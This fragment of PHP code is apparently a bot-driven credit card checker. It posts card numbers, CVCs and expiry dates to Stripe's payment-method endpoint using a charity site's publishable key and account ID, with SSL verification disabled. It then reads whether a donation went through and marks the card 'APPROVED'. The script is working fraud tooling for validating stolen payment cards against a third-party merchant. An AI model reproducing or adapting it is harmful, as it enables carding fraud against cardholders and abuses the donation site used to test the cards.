...
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");
  ...
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=407&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=NY&billing_details[address][postal_code]=10080&billing_details[address][country]=GB&billing_details[name]=broken+noob&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f&muid=091ef4ef-53ec-4eb1-b820-tps%3A%2F%2Fwww.thisissoutheastasia.com&time_on_page=294947&key=pkSHZ2I2cfPy9kbtACHQm6L4iXKo7UrmGhIfYMbY0uOTplvTqCcbmuIRSSz4Al0VPaQw0RfXk7VS00wReSLMS5&_stripe_account=acct_1JkLk2JIyVIAYeSH');
...
$end_time = microtime(true);
  ...
  if (
      ...
      strpos($result2, "/donations/tank_you?donation_number=") !== false
  ) {
    $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
